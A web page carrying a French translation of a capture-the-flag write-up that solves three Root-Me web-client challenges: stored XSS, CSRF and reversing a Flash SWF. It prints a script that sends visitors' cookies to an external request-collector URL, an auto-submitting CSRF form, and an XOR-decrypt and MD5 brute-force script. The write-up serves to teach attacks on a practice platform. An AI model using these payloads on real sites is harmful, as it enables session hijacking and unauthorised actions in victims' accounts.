<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü•• üïäÔ∏è ‚Ü©Ô∏è Authentification XSS, CSRF et Flash. R√©solution de probl√®mes avec r0ot-mi Web - Client. 2e partie üë©üèΩ‚Äçüé§ üîÆ ‚öñÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article, nous d√©tournons les cookies via Stored XSS, traitons une attaque CSRF et inversons un fichier Flash SWF. Liens vers les articles pr√©...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Authentification XSS, CSRF et Flash. R√©solution de probl√®mes avec r0ot-mi Web - Client. 2e partie</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/477254/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/r-/mq/l4/r-mql46nvptwmoytomz1peetrvo.jpeg" alt="image"></div><br>  Dans cet article, nous d√©tournons les cookies via Stored XSS, traitons une attaque CSRF et inversons un fichier Flash SWF.  Liens vers les articles pr√©c√©dents: <br><br>  Partie 1: <a href="https://habr.com/ru/post/471662/">Web - authentification javascript, obscurcissement et code natif.</a>  <a href="https://habr.com/ru/post/471662/">R√©solution de probl√®mes avec r0ot-mi Web - Client.</a> <br><br><div class="spoiler">  <b class="spoiler_title">Information organisationnelle</b> <div class="spoiler_text">  Surtout pour ceux qui veulent apprendre quelque chose de nouveau et se d√©velopper dans l'un des domaines de l'information et de la s√©curit√© informatique, j'√©crirai et parlerai des cat√©gories suivantes: <br><br><ul><li>  PWN; </li><li>  cryptographie (Crypto); </li><li>  technologies de r√©seau (r√©seau); </li><li>  reverse (Reverse Engineering); </li><li>  st√©ganographie (Stegano); </li><li>  recherche et exploitation des vuln√©rabilit√©s WEB. </li></ul><br>  En plus de cela, je partagerai mon exp√©rience en criminalistique informatique, analyse de logiciels malveillants et micrologiciels, attaques sur les r√©seaux sans fil et les r√©seaux locaux, r√©alisation de pentests et √©criture d'exploits. <br><a name="habracut"></a><br>  Afin que vous puissiez vous renseigner sur les nouveaux articles, logiciels et autres informations, j'ai cr√©√© une <a href="https://t.me/RalfHackerChannel">cha√Æne dans Telegram</a> et un <a href="https://t.me/RalfHackerPublicChat">groupe pour discuter de tout probl√®me</a> dans le domaine de l'ICD.  Aussi, je consid√©rerai personnellement vos demandes, questions, suggestions et recommandations <a href="https://t.me/hackerralf8">personnelles et r√©pondrai √† tout le monde</a> . <br><br>  Toutes les informations sont fournies √† des fins √©ducatives uniquement.  L'auteur de ce document n'assume aucune responsabilit√© pour tout dommage caus√© √† quelqu'un du fait de l'utilisation des connaissances et des m√©thodes obtenues √† la suite de l'√©tude de ce document. <br></div></div><br><h2>  XSS stock√© </h2><br><img src="https://habrastorage.org/webt/bi/d9/3w/bid93w7bkfevvhabr9kzdfjp96o.png" alt="image"><br><br>  Lors de l'attribution, nous devons saisir les cookies d'administration.  Nous ouvrons le site.  Nous voyons un formulaire dans lequel vous devez saisir un titre et un message.  Entrons pour voir comment notre entr√©e est affich√©e sur le formulaire. <br><br><img src="https://habrastorage.org/webt/wp/w1/wl/wpw1wl2m1t2nubxyztoq5q-y6ye.png" alt="image"><br><br><img src="https://habrastorage.org/webt/-c/o_/5g/-co_5g6bvi60cagaiywjxhlvjr0.png" alt="image"><br><br>  Alors  Essayons de v√©rifier XSS.  En tant que charge utile, j'utiliserai l'alerte habituelle. <br><br><pre><code class="javascript hljs">&lt;script&gt;alert(<span class="hljs-number"><span class="hljs-number">1</span></span>);<span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre> <br>  Comme vous pouvez le voir, la fen√™tre d'alerte nous a √©t√© affich√©e, c'est-√†-dire que le code javascript int√©gr√© a fonctionn√©. <br><br><img src="https://habrastorage.org/webt/0d/ge/xh/0dgexhl5fm1xjacyuxs4krzwely.png" alt="image"><br><br>  Comme ceux-ci sont stock√©s XSS, il est possible de d√©tourner les cookies d'autres utilisateurs.  Si vous ne disposez pas de votre propre serveur sur le r√©seau mondial, vous pouvez utiliser <a href="https://requestbin.com/">ce site</a> . <br><br><img src="https://habrastorage.org/webt/no/ug/mi/nougmijlozdtv_85blbx5swvh8c.png" alt="image"><br><br>  Ici, on nous donne une adresse o√π nous pouvons observer toutes les demandes √† cette adresse.  Pr√©sentez maintenant la prochaine charge utile. <br><br><pre> <code class="javascript hljs">&lt;script&gt; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.write(<span class="hljs-string"><span class="hljs-string">"&lt;img src='https://en0q0bu21ne0wq.x.pipedream.net/?cookie="</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.cookie + <span class="hljs-string"><span class="hljs-string">"'&gt;&lt;/img&gt;"</span></span>); <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre> <br>  Lorsque l'utilisateur ouvre une page avec ce code, l'agent essaie de t√©l√©charger l'image et d'ex√©cuter une demande √† cette adresse.  Il utilisera son cookie comme param√®tre.  Nous examinons ensuite le param√®tre avec lequel la demande est arriv√©e - ce sera le cookie. <br><br><img src="https://habrastorage.org/webt/5w/pf/kw/5wpfkw2116zajlapwo00ca7mm1g.png" alt="image"><br><br>  Pourquoi le d√©tournement de cookies est-il dangereux?  En ins√©rant des cookies pour ce site dans notre navigateur, nous entrerons sur le site au nom de cet utilisateur, en sautant le processus d'authentification. <br><br><h2>  CSRF </h2><br><img src="https://habrastorage.org/webt/lb/3k/wa/lb3kwaj5p_tb4dejx6r7rpskapi.png" alt="image"><br><br>  Lors de la mission, nous devons activer votre compte.  Allons voir le site.  Nous sommes accueillis par un formulaire d'autorisation. <br><br><img src="https://habrastorage.org/webt/j_/rp/bs/j_rpbsfxi6y7vumxdhe_dt-dtyq.png" alt="image"><br><br>  Nous s√©lectionnons l'inscription et nous nous inscrivons sur le site. <br><br><img src="https://habrastorage.org/webt/y4/5v/q0/y45vq0u1ing6srotvrxhzxht18c.png" alt="image"><br><br>  On nous dit que nous aurons un acc√®s complet lorsque l'administrateur activera notre compte. <br><br><img src="https://habrastorage.org/webt/dk/4t/y_/dk4ty_33gsobm6_ttpyr9nt3uaw.png" alt="image"><br><br><img src="https://habrastorage.org/webt/py/-y/bi/py-ybidxzxrghfb1tcfcxrn4l2g.png" alt="image"><br><br>  Lorsque vous essayez de cocher la case vous-m√™me, nous recevons un message indiquant que nous ne sommes pas un administrateur. <br><br><img src="https://habrastorage.org/webt/us/at/f3/usatf3vbp99ipsol_odsawp-thk.png" alt="image"><br><br>  Mais nous pouvons contacter l'administrateur, c'est-√†-dire qu'il ouvrira la page.  La signification de CSRF est que l'utilisateur effectue des actions sans le savoir.  Autrement dit, nous pouvons l'obliger √† soumettre un formulaire d√©j√† rempli.  V√©rifions s'il y a un jeton qui est d√©fini et v√©rifi√© par le serveur - comme protection contre de telles attaques.  C'est diff√©rent √† chaque fois. <br><br><img src="https://habrastorage.org/webt/wp/mz/7f/wpmz7fomfsktcct7vfbv2ly0mdk.png" alt="image"><br><br>  Il n'y a pas de jeton.  Cette forme de charge utile sortira de cette forme. <br><br><pre> <code class="javascript hljs">&lt;form id=<span class="hljs-string"><span class="hljs-string">"form"</span></span> action=<span class="hljs-string"><span class="hljs-string">"http://challenge01.root-me.org/web-client/ch22/?action=profile"</span></span> method=<span class="hljs-string"><span class="hljs-string">"post"</span></span> enctype=<span class="hljs-string"><span class="hljs-string">"multipart/form-data"</span></span>&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">input</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"username"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"ralf"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">input</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"checkbox"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"status"</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">checked</span></span></span></span><span class="xml"><span class="hljs-tag"> &gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">button</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml">Submit</span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">button</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">form</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"> </span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="javascript"><span class="hljs-built_in"><span class="xml"><span class="javascript"><span class="hljs-built_in">document</span></span></span></span><span class="xml"><span class="javascript">.getElementById(</span></span><span class="hljs-string"><span class="xml"><span class="javascript"><span class="hljs-string">"form"</span></span></span></span><span class="xml"><span class="javascript">).submit()</span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre><br>  Voici un formulaire d√©j√† rempli de nos donn√©es, avec une coche activ√©e.  Le code Javascript l'enverra apr√®s le chargement de la page, respectivement, au nom de l'administrateur qui l'a consult√©e. <br><br><img src="https://habrastorage.org/webt/m_/t2/bc/m_t2bcdlxaig9zveebwywlshxxs.png" alt="image"><br><br><img src="https://habrastorage.org/webt/r4/zs/ri/r4zsrik1kijpyovteby1ip5mpms.png" alt="image"><br><br>  Apr√®s un certain temps, nous actualisons la page.  Notre compte a √©t√© activ√©. <br><br><img src="https://habrastorage.org/webt/hy/zi/lf/hyzilfrq6yfqtoi1je_6gsqhaqc.png" alt="image"><br><br><h2>  Flash </h2><br><img src="https://habrastorage.org/webt/dt/j5/xz/dtj5xzyfn6sk9w2-rhoarsuvwla.png" alt="image"><br><br>  Nous devons trouver un code valide.  Ouvrons la page.  Nous sommes accueillis par une sorte de m√©canisme de code. <br><br><img src="https://habrastorage.org/webt/nn/u8/qi/nnu8qij2y9inqv_hmfqyim1tni4.png" alt="image"><br><br>  Jetons un coup d'≈ìil au code. <br><br><img src="https://habrastorage.org/webt/fk/rp/sl/fkrpslpl34fnprykl4u9p31jlxm.png" alt="image"><br><br>  Nous voyons que le code converti est v√©rifi√© sur JS, que nous introduisons.  Reste √† d√©couvrir l'algorithme de conversion.  Le code contient √©galement un lien vers le fichier swf.  T√©l√©chargeons-le. <br><br><img src="https://habrastorage.org/webt/ll/rq/d8/llrqd8283ltjtxbxhkphpqa_vta.png" alt="image"><br><br>  Nous voyons qu'il s'agit d'un Macromedia Flash compress√©.  Pour inverser de tels fichiers, je pr√©f√®re utiliser JPEXS. <br><br><img src="https://habrastorage.org/webt/ql/a2/y8/qla2y8d6gnbbkocuhr73s-bgw7m.png" alt="image"><br><br>  On retrouve le script principal. <br><br><img src="https://habrastorage.org/webt/bl/9i/nd/bl9ind3lqpv2eyfxyxy-p0ars48.png" alt="image"><br><br>  Prenons-le √† part. <br><br><img src="https://habrastorage.org/webt/36/v0/cr/36v0cri-bjelb5otuyvopvasupe.png" alt="image"><br><br>  Il charge les donn√©es d'un autre script imbriqu√©, les mord avec la cl√© et l'envoie pour ex√©cution.  Faisons-le.  Nous trouvons d'abord ces donn√©es. <br><br><img src="https://habrastorage.org/webt/iq/ay/vm/iqayvmvjtagwyvbrwtojrrfiknm.png" alt="image"><br><br>  Et puis exportez vers un fichier s√©par√©. <br><br><img src="https://habrastorage.org/webt/lq/mw/si/lqmwsi0umzkyq1gr9bzrkqatr7c.png" alt="image"><br><br>  Maintenant, procurez-les avec la cl√©. <br><br><pre> <code class="python hljs">f = open(<span class="hljs-string"><span class="hljs-string">'1_RootMe_EmbeddedSWF.bin'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>) swf_crypt = f.read() f.close() key = <span class="hljs-string"><span class="hljs-string">'rootmeifyoucan'</span></span> swf_decrypt = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(swf_crypt)): swf_decrypt += chr(ord(swf_crypt[i]) ^ ord(key[i%len(key)])) f = open(<span class="hljs-string"><span class="hljs-string">'NewEmbedded.swf'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>) f.write(swf_decrypt) f.close()</code> </pre> <br>  Nous obtenons un nouveau fichier.  Ouvrez-le dans JPEXS. <br><br><img src="https://habrastorage.org/webt/fm/op/se/fmopse5vj28lgfek6qrudlzmrhk.png" alt="image"><br><br>  Nous trouvons le script principal et commen√ßons √† analyser. <br><br><img src="https://habrastorage.org/webt/w2/kn/wt/w2knwtpt48wviy66zukq1bsyoiq.png" alt="image"><br><br>  Puisque vous devez encore √©crire du code.  J'en publierai des parties. <br><br><pre> <code class="python hljs">but1 = <span class="hljs-number"><span class="hljs-number">11266775</span></span> but2 = <span class="hljs-number"><span class="hljs-number">11146309</span></span> but3 = <span class="hljs-number"><span class="hljs-number">7884889</span></span> but4 = <span class="hljs-number"><span class="hljs-number">8049718</span></span> Hash = <span class="hljs-string"><span class="hljs-string">'dbbcd6ee441aa6d2889e6e3cae6adebe'</span></span></code> </pre> <br>  Ici, nous voyons le code de chaque bouton et son emplacement dans les coordonn√©es.  Cela nous aidera √† comprendre quel bouton a quel code. <br><br><img src="https://habrastorage.org/webt/8p/bz/qy/8pbzqyodzswssj7sh9fye6idtis.png" alt="image"><br><br>  Nous apprenons de cela que la longueur du code doit √™tre √©gale ou sup√©rieure √† 12. Et que la valeur finale est le hachage MD5 de la cha√Æne invers√©e. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> hashlib <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> itertools <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> var <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> itertools.product(<span class="hljs-string"><span class="hljs-string">'1234'</span></span>, repeat=<span class="hljs-number"><span class="hljs-number">12</span></span>): ... ... <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(code) &gt;= <span class="hljs-number"><span class="hljs-number">12</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> h = md5(code[::<span class="hljs-number"><span class="hljs-number">-1</span></span>].encode()).hexdigest()</code> </pre> <br><img src="https://habrastorage.org/webt/7y/qb/hg/7yqbhgmkvpjuljssdh1p-rpubzk.png" alt="image"><br><br>  Au lieu de d√©crire, je vais simplement donner ce code en python'e. <br><br><pre> <code class="python hljs">code = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> char <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> var: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> char == <span class="hljs-string"><span class="hljs-string">'1'</span></span>: code += format((but1 &gt;&gt; <span class="hljs-number"><span class="hljs-number">16</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>), <span class="hljs-string"><span class="hljs-string">'02X'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> char == <span class="hljs-string"><span class="hljs-string">'2'</span></span>: code += format((but2 &gt;&gt; <span class="hljs-number"><span class="hljs-number">8</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>), <span class="hljs-string"><span class="hljs-string">'02X'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> char == <span class="hljs-string"><span class="hljs-string">'3'</span></span>: code += format((but3 &gt;&gt; <span class="hljs-number"><span class="hljs-number">0</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>), <span class="hljs-string"><span class="hljs-string">'02X'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> char == <span class="hljs-string"><span class="hljs-string">'4'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(code) &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>: code = code[<span class="hljs-number"><span class="hljs-number">0</span></span>:<span class="hljs-number"><span class="hljs-number">-1</span></span>]</code> </pre><br>  Ainsi, nous devons trier 4 ^ 12 = 16777216 options.  Une bagatelle. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> hashlib <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> itertools but1 = <span class="hljs-number"><span class="hljs-number">11266775</span></span> but2 = <span class="hljs-number"><span class="hljs-number">11146309</span></span> but3 = <span class="hljs-number"><span class="hljs-number">7884889</span></span> but4 = <span class="hljs-number"><span class="hljs-number">8049718</span></span> Hash = <span class="hljs-string"><span class="hljs-string">'dbbcd6ee441aa6d2889e6e3cae6adebe'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> var <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> itertools.product(<span class="hljs-string"><span class="hljs-string">'1234'</span></span>, repeat=<span class="hljs-number"><span class="hljs-number">12</span></span>): code = <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> char <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> var: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> char == <span class="hljs-string"><span class="hljs-string">'1'</span></span>: code += format((but1 &gt;&gt; <span class="hljs-number"><span class="hljs-number">16</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>), <span class="hljs-string"><span class="hljs-string">'02X'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> char == <span class="hljs-string"><span class="hljs-string">'2'</span></span>: code += format((but2 &gt;&gt; <span class="hljs-number"><span class="hljs-number">8</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>), <span class="hljs-string"><span class="hljs-string">'02X'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> char == <span class="hljs-string"><span class="hljs-string">'3'</span></span>: code += format((but3 &gt;&gt; <span class="hljs-number"><span class="hljs-number">0</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span>), <span class="hljs-string"><span class="hljs-string">'02X'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> char == <span class="hljs-string"><span class="hljs-string">'4'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(code) &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>: code = code[<span class="hljs-number"><span class="hljs-number">0</span></span>:<span class="hljs-number"><span class="hljs-number">-1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(code) &gt;= <span class="hljs-number"><span class="hljs-number">12</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> h = md5(code[::<span class="hljs-number"><span class="hljs-number">-1</span></span>].encode()).hexdigest() print(<span class="hljs-string"><span class="hljs-string">"Password: %s, code: %s"</span></span> % (var, code)) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> h == Hash: print(<span class="hljs-string"><span class="hljs-string">'Correct password:'</span></span> + <span class="hljs-string"><span class="hljs-string">""</span></span>.join(var)) Break</code> </pre> <br><img src="https://habrastorage.org/webt/bx/mf/4d/bxmf4dpr0acd8qfmhg3n-lspai8.png" alt="image"><br><br>  Vous avez un mot de passe et un code. <br><br>  De plus en plus compliqu√© ... Vous pouvez nous rejoindre sur <a href="https://t.me/RalfHackerChannel">Telegram</a> .  Cr√©ons une communaut√© dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pouvons toujours nous entraider pour tout probl√®me informatique et de s√©curit√© de l'information. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr477254/">https://habr.com/ru/post/fr477254/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr477242/index.html">Comment nous avons choisi ServiceDesk. 3e partie</a></li>
<li><a href="../fr477244/index.html">RayTracing compr√©hensible en 256 lignes de C ++ nu</a></li>
<li><a href="../fr477248/index.html">Ma premi√®re exp√©rience de r√©cup√©ration d'une base de donn√©es Postgres apr√®s un crash (page invalide dans le bloc 4123007 de relatton base / 16490)</a></li>
<li><a href="../fr477250/index.html">Vous souhaitez donc ex√©cuter Windows 10 sur une calculatrice? Ok</a></li>
<li><a href="../fr477252/index.html">Comment les incubateurs et les acc√©l√©rateurs d'entreprises se sont d√©velopp√©s: du laboratoire de Thomas Edison au combinateur Y</a></li>
<li><a href="../fr477256/index.html">Le premier lancement √† part enti√®re de OneWeb sur le lanceur Soyouz est report√© l'ann√©e prochaine, ainsi que le lancement du lanceur Angara</a></li>
<li><a href="../fr477262/index.html">Andro√Ødes de la soci√©t√© Promobot. Vue lat√©rale</a></li>
<li><a href="../fr477264/index.html">La pelle s'est transform√©e en un robot autonome capable de creuser des tranch√©es ind√©pendamment</a></li>
<li><a href="../fr477266/index.html">Le condens√© de mati√®res fra√Æches du monde du front-end de la derni√®re semaine n ¬∞ 390 (18-24 novembre 2019)</a></li>
<li><a href="../fr477268/index.html">Optimisation de la solution de recherche sur github</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>